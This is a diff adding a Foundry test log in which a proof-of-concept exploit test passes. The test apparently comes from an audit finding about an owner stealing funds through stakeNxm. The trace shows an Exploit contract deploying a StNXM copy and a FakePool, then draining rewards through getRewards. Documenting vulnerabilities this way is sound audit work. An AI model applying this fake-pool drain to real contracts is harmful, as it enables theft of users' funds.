@@ -1,0 +1,38 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/64082-h-4-owner-can-steal-funds-from-contract-by-calling-stakenxm_exp.sol:PoC_64082
+[PASS] test_exploit() (gas: 1103421)
+Traces:
+  [1103421] PoC_64082::test_exploit()
+    ├─ [579611] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 2895 bytes of code
+    ├─ [490467] Exploit::run()
+    │   ├─ [278803] → new StNXM@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 1000
+    │   │   └─ ← [Return] 1282 bytes of code
+    │   ├─ [73121] → new FakePool@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 365 bytes of code
+    │   ├─ [24484] StNXM::stakeNxm(100, FakePool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   ├─ [593] FakePool::depositTo(100)
+    │   │   │   └─ ← [Return] 7
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   │   @ 0: 1000 → 900
+    │   │   └─ ← [Stop]
+    │   ├─ [2205] StNXM::getRewards()
+    │   │   ├─ [571] FakePool::withdraw(7)
+    │   │   │   └─ ← [Return] 1000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 900 → 1900
+    │   │   └─ ← [Return] 1000
+    │   ├─ emit Proof(reward: 1000)
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 1000
+    │   │   @ 1: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 478.67µs (290.12µs CPU time)
+
+Ran 1 test suite in 4.80ms (478.67µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
